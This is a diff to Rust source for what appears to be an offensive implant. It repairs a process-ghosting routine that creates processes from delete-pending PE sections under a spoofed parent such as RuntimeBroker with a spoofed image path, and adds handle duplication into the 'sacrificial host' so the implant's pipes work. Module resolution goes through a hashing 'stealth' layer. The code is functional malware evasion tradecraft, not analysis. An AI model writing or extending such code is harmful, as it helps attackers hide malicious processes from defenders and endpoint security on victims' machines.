@@ -43,6 +43,7 @@ const HANDLE_FLAG_INHERIT: u32 = 0x1;
 const PROCESS_CREATE_FLAGS_INHERIT_HANDLES: u32 = 0x4;
 // DELETE | GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE (practical mask for write+section)
 const FILE_ACCESS_RW_DELETE: u32 = 0x0001_0000 | 0x8000_0000 | 0x4000_0000 | 0x0010_0000;
+const DUPLICATE_SAME_ACCESS: u32 = 0x0000_0002;
 
 #[repr(C)]
 struct UnicodeString {
@@ -266,14 +267,39 @@ unsafe fn ghost_section_spawn(pe: &[u8], parent_name: &str) -> Result<SpoofedPip
         }
     };
 
-    // Process parameters: spoofed ImagePath + std handles (pipes)
-    if let Err(e) =
-        write_process_parameters(h_process, ntdll, stdin_r, stdout_w, stdout_w, parent_label)
-    {
+    // CRITICAL: NtCreateProcessEx(ParentProcess=spoofed) + INHERIT_HANDLES inherits
+    // handles from RuntimeBroker/etc., NOT from the agent. Agent-local pipe handle
+    // values written into ProcessParameters are invalid in the child → CRT dies on
+    // first stdin read → agent WriteFile gets broken pipe (err 109/232).
+    // Inject real pipe ends into the child via DuplicateHandle, then write those
+    // *remote* handle values into RTL_USER_PROCESS_PARAMETERS.
+    let (remote_stdin, remote_stdout) =
+        match duplicate_pipes_into_child(h_process, stdin_r, stdout_w) {
+            Ok(v) => v,
+            Err(e) => {
+                let _ = crate::native::close_handle(h_process);
+                cleanup_four(stdin_r, stdin_w, stdout_r, stdout_w);
+                return Err(e);
+            }
+        };
+
+    // Process parameters: spoofed ImagePath + child-valid std handles
+    if let Err(e) = write_process_parameters(
+        h_process,
+        ntdll,
+        remote_stdin,
+        remote_stdout,
+        remote_stdout,
+        parent_label,
+    ) {
         let _ = crate::native::close_handle(h_process);
         cleanup_four(stdin_r, stdin_w, stdout_r, stdout_w);
         return Err(e);
     }
+
+    // Local child-end copies are no longer needed; remote copies live in the child.
+    let _ = crate::native::close_handle(stdin_r);
+    let _ = crate::native::close_handle(stdout_w);
 
     type NtCreateThreadExFn = unsafe extern "system" fn(
         *mut usize,
@@ -305,14 +331,12 @@ unsafe fn ghost_section_spawn(pe: &[u8], parent_name: &str) -> Result<SpoofedPip
     );
     if st < 0 || h_thread == 0 {
         let _ = crate::native::close_handle(h_process);
-        cleanup_four(stdin_r, stdin_w, stdout_r, stdout_w);
+        // stdin_r / stdout_w already closed; only agent-side ends remain
+        let _ = crate::native::close_handle(stdin_w);
+        let _ = crate::native::close_handle(stdout_r);
         return Err(format!("NtCreateThreadEx 0x{:08X}", st as u32));
     }
     let _ = crate::native::close_handle(h_thread);
-
-    // Close ends we don't need (child inherits stdin_r / stdout_w)
-    let _ = crate::native::close_handle(stdin_r);
-    let _ = crate::native::close_handle(stdout_w);
 
     let pid = query_pid(h_process).unwrap_or(0);
     let _ = std::fs::remove_file(&tmp_path); // usually already gone
@@ -323,6 +347,56 @@ unsafe fn ghost_section_spawn(pe: &[u8], parent_name: &str) -> Result<SpoofedPip
         stdin_write: stdin_w,
         stdout_read: stdout_r,
     })
+}
+
+/// Duplicate agent-local pipe ends into `h_child` so ProcessParameters can reference
+/// handles that are valid inside the sacrificial host.
+unsafe fn duplicate_pipes_into_child(
+    h_child: usize,
+    stdin_r: usize,
+    stdout_w: usize,
+) -> Result<(usize, usize), String> {
+    let k32 = stealth::get_module_base(stealth::hash_module_name(b"kernel32.dll"));
+    type DuplicateHandleFn =
+        unsafe extern "system" fn(usize, usize, usize, *mut usize, u32, i32, u32) -> i32;
+    let dup: DuplicateHandleFn = transmute_api(k32, b"DuplicateHandle")?;
+
+    let mut remote_stdin = 0usize;
+    let mut remote_stdout = 0usize;
+    // bInheritHandle=FALSE: already injected; no further inheritance needed.
+    if dup(
+        crate::native::CURRENT_PROCESS,
+        stdin_r,
+        h_child,
+        &mut remote_stdin,
+        0,
+        0,
+        DUPLICATE_SAME_ACCESS,
+    ) == 0
+    {
+        return Err(format!(
+            "DuplicateHandle stdin→child failed (pipe would be invalid in host)"
+        ));
+    }
+    if dup(
+        crate::native::CURRENT_PROCESS,
+        stdout_w,
+        h_child,
+        &mut remote_stdout,
+        0,
+        0,
+        DUPLICATE_SAME_ACCESS,
+    ) == 0
+    {
+        // Best-effort: leave remote_stdin in child; process will be torn down by caller.
+        return Err(format!(
+            "DuplicateHandle stdout→child failed (pipe would be invalid in host)"
+        ));
+    }
+    if remote_stdin == 0 || remote_stdout == 0 {
+        return Err("DuplicateHandle returned null remote pipe handle".into());
+    }
+    Ok((remote_stdin, remote_stdout))
 }
 
 /// Create SEC_IMAGE section from PE bytes using a delete-pending file (ghost prep).
